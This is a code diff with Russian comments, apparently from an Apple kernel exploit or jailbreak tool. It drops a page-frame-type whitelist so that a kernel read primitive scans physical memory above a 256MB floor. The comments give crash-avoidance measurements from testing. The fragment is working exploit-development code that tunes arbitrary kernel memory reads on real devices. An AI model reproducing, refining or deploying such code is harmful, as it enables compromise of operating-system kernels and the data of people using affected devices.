@@ -8275,10 +8275,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // (13% RAM, зонные данные) и 0x21=9k (тип
                             // proc-объекта из census) — вот они и добавлены.
                             // 1GB-пол закрывает нижние минные PA.
-                            BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2 ||
-                                                t == 0x0e || t == 0x21 || t == 0x37 ||
-                                                t == 0x11 || t == 0x13 || t == 0x17 || t == 0x18 ||
-                                                (t >= 0x2f && t <= 0x36));   // 2.0.12: крошечные типы (~100 кадров)
+                            // 2.0.13: БЕЗ type-фильтра для PA≥256MB. Данные:
+                            // 475k кадров (10+ типов, включая «deadly» 0xb/0x18/0x37)
+                            // прочитаны через kernel aperture без единой паники;
+                            // все смерти были только ниже 108MB. Пол 256MB держит
+                            // минное поле. Остальные типы (0x12/0x14/0x38 — 1-5
+                            // кадров, крошечные зоны) — теперь тоже читаются.
+                            BOOL whitelisted = YES;
                             if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
                             if (!whitelisted) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
@@ -8337,9 +8340,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             for (uint64_t li = (0x10000000ULL >> 14); li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
                                 uint64_t lpa = pB + (li << 14);
                                 int lt = kpFrameTypeOf(lpa);
-                                BOOL lw = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
-                                           lt == 0x0e || lt == 0x21 || lt == 0x37 ||
-                                           lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
+                                BOOL lw = YES;   // 2.0.13: без фильтра, пол 256MB держит минное поле
                                 if (!lw) continue;
                                 uint64_t pkva3 = useLinear ? (lpa - pB + vB) : phystokv(lpa);
                                 if (!pkva3) continue;
